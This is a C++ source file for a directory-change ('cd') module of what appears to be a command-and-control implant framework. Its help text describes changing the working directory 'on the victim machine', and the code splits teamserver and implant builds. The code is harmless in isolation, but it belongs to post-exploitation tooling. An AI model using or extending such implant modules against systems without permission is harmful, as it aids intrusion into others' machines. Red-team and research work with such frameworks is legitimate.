#include "ChangeDirectory.hpp"

#include "Common.hpp"

#include <cstring>
#include <array>
#include <filesystem>

using namespace std;


constexpr std::string_view moduleName = "cd";
constexpr unsigned long long moduleHash = djb2(moduleName);


#ifdef _WIN32

__declspec(dllexport) ChangeDirectory* ChangeDirectoryConstructor() 
{
    return new ChangeDirectory();
}

#else

__attribute__((visibility("default"))) ChangeDirectory* ChangeDirectoryConstructor() 
{
    return new ChangeDirectory();
}

#endif


ChangeDirectory::ChangeDirectory()
#ifdef BUILD_TEAMSERVER
    : ModuleCmd(std::string(moduleName), moduleHash)
#else
    : ModuleCmd("", moduleHash)
#endif
{
}

ChangeDirectory::~ChangeDirectory()
{
}

std::string ChangeDirectory::getInfo()
{
    std::string info;
#ifdef BUILD_TEAMSERVER
    info += "ChangeDirectory Module:\n";
    info += "Change the current working directory on the victim machine.\n";
    info += "This affects the context for relative file paths in subsequent commands.\n";
    info += "\nExample:\n";
    info += "- cd /tmp\n";
    info += "- cd C:\\Users\\Public\n";
#endif
    return info;
}

int ChangeDirectory::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
{
#if defined(BUILD_TEAMSERVER) || defined(C2CORE_BUILD_TESTS) 
    if (splitedCmd.empty())
    {
        c2Message.set_returnvalue(getInfo());
        return -1;
    }
    string path;
    for (int idx = 1; idx < splitedCmd.size(); idx++) 
    {
        if(!path.empty())
            path+=" ";
        path+=splitedCmd[idx];
    }

    c2Message.set_instruction(splitedCmd[0]);
    c2Message.set_cmd(path);
#endif
    return 0;
}


int ChangeDirectory::process(C2Message &c2Message, C2Message &c2RetMessage)
{
    string path = c2Message.cmd();
    std::string outCmd;
    const bool changed = changeDirectory(path, outCmd);

    c2RetMessage.set_instruction(c2RetMessage.instruction());
    c2RetMessage.set_cmd(path);
    c2RetMessage.set_returnvalue(outCmd);
    c2RetMessage.set_errorCode(changed ? 0 : 1);

    return 0;
}


int ChangeDirectory::errorCodeToMsg(const C2Message& c2RetMessage, std::string& errorMsg)
{
#if defined(BUILD_TEAMSERVER) || defined(C2CORE_BUILD_TESTS)
    if (c2RetMessage.errorCode() == 1)
        errorMsg = "Failed: Could not change directory";
#endif
    return 0;
}

bool ChangeDirectory::changeDirectory(const std::string& path, std::string& result)
{
    std::error_code ec;
    if (!path.empty())
        std::filesystem::current_path(path, ec);
    const bool changed = !ec;
    result = std::filesystem::current_path(ec).string();
    return changed && !ec;
}
